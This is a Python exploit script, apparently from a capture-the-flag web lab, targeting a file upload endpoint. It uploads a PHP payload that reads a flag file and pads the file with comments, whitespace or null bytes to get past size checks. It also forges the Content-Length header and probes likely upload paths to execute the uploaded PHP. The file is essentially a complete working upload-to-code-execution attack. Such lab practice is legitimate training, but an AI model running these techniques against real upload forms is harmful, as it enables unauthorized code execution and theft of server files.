#!/usr/bin/env python3
"""
File Upload Size Bypass Script using Padding Techniques
Target: http://test-s3.web0x05.hbtn/task4
"""

import requests
import sys
from io import BytesIO

# Configuration
TARGET_URL = "http://test-s3.web0x05.hbtn/task4"
UPLOAD_DIR = "/static/upload/"
BASE_PAYLOAD = "<?php readfile('FLAG_4.txt') ?>"

def create_padded_payload(base_payload, padding_size, method="comment"):
    """
    Create a PHP payload with padding to manipulate file size
    
    Methods:
    - comment: Use PHP comments for padding
    - whitespace: Use whitespace/newlines
    - null: Use null bytes
    - mixed: Combination of techniques
    """
    
    if method == "comment":
        # Add PHP comment padding before the payload
        padding = "/*" + "A" * padding_size + "*/"
        payload = padding + "\n" + base_payload
    
    elif method == "whitespace":
        # Add whitespace padding
        padding = "\n" * padding_size
        payload = base_payload + padding
    
    elif method == "null":
        # Add null bytes (might be filtered)
        padding = "\x00" * padding_size
        payload = base_payload + padding
    
    elif method == "mixed":
        # Mixed approach: comments + whitespace
        comment_pad = "/*" + "X" * (padding_size // 2) + "*/"
        whitespace_pad = "\n" * (padding_size // 2)
        payload = comment_pad + "\n" + base_payload + "\n" + whitespace_pad
    
    else:
        payload = base_payload
    
    return payload

def test_file_size_limit(url):
    """
    Test different file sizes to find the server's limit
    """
    print("[*] Testing file size restrictions...")
    
    test_sizes = [10, 50, 100, 200, 500, 1000, 2000, 5000]
    
    for size in test_sizes:
        try:
            payload = create_padded_payload(BASE_PAYLOAD, size, "comment")
            files = {'file': ('test.php', payload, 'application/x-php')}
            
            response = requests.post(url, files=files, timeout=10)
            print(f"[+] Size {len(payload)} bytes: Status {response.status_code}")
            
            if "error" in response.text.lower() or "too large" in response.text.lower():
                print(f"[!] Size limit appears to be around {len(payload)} bytes")
                return len(payload)
                
        except Exception as e:
            print(f"[-] Error testing size {size}: {e}")
    
    return None

def upload_with_padding(url, padding_size=0, method="comment", filename="exploit.php"):
    """
    Upload PHP file with padding techniques
    """
    print(f"\n[*] Attempting upload with padding method: {method}, size: {padding_size}")
    
    # Create padded payload
    payload = create_padded_payload(BASE_PAYLOAD, padding_size, method)
    
    print(f"[*] Payload size: {len(payload)} bytes")
    print(f"[*] Payload preview:\n{payload[:200]}...")
    
    # Prepare file upload
    files = {
        'file': (filename, payload, 'application/x-php')
    }
    
    try:
        # Upload the file
        response = requests.post(url, files=files, timeout=15)
        
        print(f"\n[+] Response Status: {response.status_code}")
        print(f"[+] Response Headers:")
        for header, value in response.headers.items():
            print(f"    {header}: {value}")
        
        print(f"\n[+] Response Body:")
        print(response.text[:500])
        
        # Check for success indicators
        if response.status_code == 200:
            print("\n[✓] Upload appears successful!")
            
            # Try to find the uploaded file path in response
            if "upload" in response.text or ".php" in response.text:
                print("[*] File path might be in response")
            
            return True
        else:
            print(f"\n[!] Upload failed with status {response.status_code}")
            return False
            
    except Exception as e:
        print(f"[-] Upload error: {e}")
        return False

def manipulate_content_length(url, filename="exploit.php"):
    """
    Try to bypass by manipulating Content-Length header
    """
    print("\n[*] Attempting Content-Length manipulation...")
    
    payload = BASE_PAYLOAD
    
    # Create custom multipart data with modified Content-Length
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: application/x-php\r\n\r\n"
        f"{payload}\r\n"
        f"--{boundary}--\r\n"
    )
    
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Content-Length': '1'  # Lie about the content length
    }
    
    try:
        response = requests.post(url, data=body, headers=headers, timeout=15)
        print(f"[+] Response Status: {response.status_code}")
        print(f"[+] Response: {response.text[:300]}")
        return response.status_code == 200
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def access_uploaded_file(base_url, filename="exploit.php"):
    """
    Try to access the uploaded file to trigger PHP execution
    """
    possible_paths = [
        f"/static/upload/{filename}",
        f"/upload/{filename}",
        f"/uploads/{filename}",
        f"/static/{filename}"
    ]
    
    print("\n[*] Attempting to access uploaded file...")
    
    for path in possible_paths:
        try:
            full_url = base_url.replace("/task4", "") + path
            print(f"[*] Trying: {full_url}")
            
            response = requests.get(full_url, timeout=10)
            
            if response.status_code == 200:
                print(f"\n[✓] FILE FOUND! Status: {response.status_code}")
                print(f"[✓] Response:\n{response.text}")
                
                if "HBTN{" in response.text or "FLAG" in response.text:
                    print(f"\n[🎉] FLAG FOUND! 🎉")
                    print(response.text)
                
                return True
                
        except Exception as e:
            print(f"[-] Error accessing {path}: {e}")
    
    return False

def main():
    print("=" * 60)
    print("File Upload Size Bypass - Padding Technique")
    print("=" * 60)
    print(f"Target: {TARGET_URL}")
    print(f"Payload: {BASE_PAYLOAD}")
    print("=" * 60)
    
    # Method 1: Test file size limit
    limit = test_file_size_limit(TARGET_URL)
    
    # Method 2: Try different padding techniques
    padding_methods = ["comment", "whitespace", "mixed"]
    padding_sizes = [0, 100, 500, 1000, 2000, 5000]
    
    for method in padding_methods:
        for size in padding_sizes:
            success = upload_with_padding(TARGET_URL, size, method, f"exploit_{method}_{size}.php")
            
            if success:
                # Try to access the uploaded file
                access_uploaded_file(TARGET_URL, f"exploit_{method}_{size}.php")
                print("\n" + "=" * 60)
    
    # Method 3: Content-Length manipulation
    manipulate_content_length(TARGET_URL)
    
    # Try to access with common filenames
    print("\n[*] Trying to access uploaded files...")
    common_names = ["exploit.php", "shell.php", "test.php", "upload.php"]
    for name in common_names:
        access_uploaded_file(TARGET_URL, name)

if __name__ == "__main__":
    main()
